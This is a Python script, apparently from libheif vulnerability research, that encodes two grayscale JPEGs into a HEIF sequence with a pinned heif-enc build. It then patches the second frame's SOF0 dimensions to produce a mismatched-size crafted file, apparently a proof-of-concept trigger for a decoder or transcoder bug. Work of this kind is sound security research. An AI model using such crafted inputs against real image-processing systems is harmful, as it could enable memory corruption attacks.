#!/usr/bin/env python3
"""W183: derive a mixed-size MJPEG HEIF whose first frame is genuinely 512x72.

Unlike W181 (SOF0 of a 64-row JPEG patched to 72, leaving libjpeg filler rows),
both committed source JPEGs are real 512x72 grayscale images. The pinned
v1.23.6 heif-enc -S writes ref.heif; only the SECOND sample's SOF0 dimensions
are patched from (H=72,W=512) to (H=512,W=64), so frame 1 decodes 64x512 while
x265 takes its coded size from the genuine 512x72 first frame.

Source recipe (PIL 10.2.0, grayscale, quality 5, 4:4:4, optimize=True):
    rows[y] = (32 + (y % 8) * 16) & 0xff, repeated across each row
    Image.frombytes('L', (512, 72), rows).save('fN.jpg', format='JPEG',
                                              quality=5, subsampling=0,
                                              optimize=True)
    HEIF_ENC -S --jpeg f0.jpg f1.jpg -o ref.heif

Usage: make_genuine_72_sequence.py SOURCE_DIR
HEIF_ENC defaults to the pinned plain Release heif-enc build tree.
"""
import hashlib
import os
import struct
import subprocess
import sys
from pathlib import Path

HASHES = {
    "f0.jpg": "652723cd946477e810afb4c1b60d6cac05d6e65c25c3e6a95c6377506675969a",
    "f1.jpg": "652723cd946477e810afb4c1b60d6cac05d6e65c25c3e6a95c6377506675969a",
    "ref.heif": "24c5906bd508988d3eafa3af73c4f86e0fa4157bb4a89d1bb1dd7e32e07da80e",
    "mixed.heif": "5a39f4885b8ae4d67754e96a983af5237e1af6acc51d8092efb073cbc0586a53",
}
DEFAULT_ENC = "/tmp/libheif2shell-vuln-plain/examples/heif-enc"


def digest(path):
    return hashlib.sha256(Path(path).read_bytes()).hexdigest()


def main():
    if len(sys.argv) != 2:
        raise SystemExit("usage: make_genuine_72_sequence.py SOURCE_DIR")
    out = Path(sys.argv[1])
    enc = os.environ.get("HEIF_ENC", DEFAULT_ENC)
    for name in ("f0.jpg", "f1.jpg"):
        if digest(out / name) != HASHES[name]:
            raise SystemExit(f"{name}: source JPEG changed")
    ref = out / "ref.heif"
    subprocess.run([enc, "-S", "--jpeg", str(out / "f0.jpg"),
                    str(out / "f1.jpg"), "-o", str(ref)], check=True,
                   capture_output=True)
    if digest(ref) != HASHES["ref.heif"]:
        raise SystemExit(f"ref.heif: unexpected sha256 {digest(ref)}")

    data = bytearray(ref.read_bytes())
    offset, payload = 0, None
    while offset + 8 <= len(data):
        size, kind = struct.unpack_from(">I4s", data, offset)
        if size < 8 or offset + size > len(data):
            raise SystemExit(f"bad box at {offset}")
        if kind == b"mdat":
            payload = (offset + 8, offset + size)
        offset += size
    start, end = payload
    soi = [start + i for i in range(end - start - 1)
           if data[start + i] == 0xFF and data[start + i + 1] == 0xD8]
    if len(soi) != 2:
        raise SystemExit(f"expected two JPEG samples in last mdat, got {len(soi)}")
    sof = data.find(b"\xff\xc0", soi[1], end)
    if sof < 0:
        raise SystemExit("no SOF0 in second sample")
    height, width = struct.unpack_from(">HH", data, sof + 5)
    if (width, height) != (512, 72):
        raise SystemExit(f"unexpected second-frame size {width}x{height}")
    struct.pack_into(">HH", data, sof + 5, 512, 64)  # SOF order: H,W
    mixed = out / "mixed.heif"
    mixed.write_bytes(data)
    if digest(mixed) != HASHES["mixed.heif"]:
        raise SystemExit(f"mixed.heif: unexpected sha256 {digest(mixed)}")
    print(f"wrote {mixed}: {len(data)} bytes, sha256={digest(mixed)}")


if __name__ == "__main__":
    main()
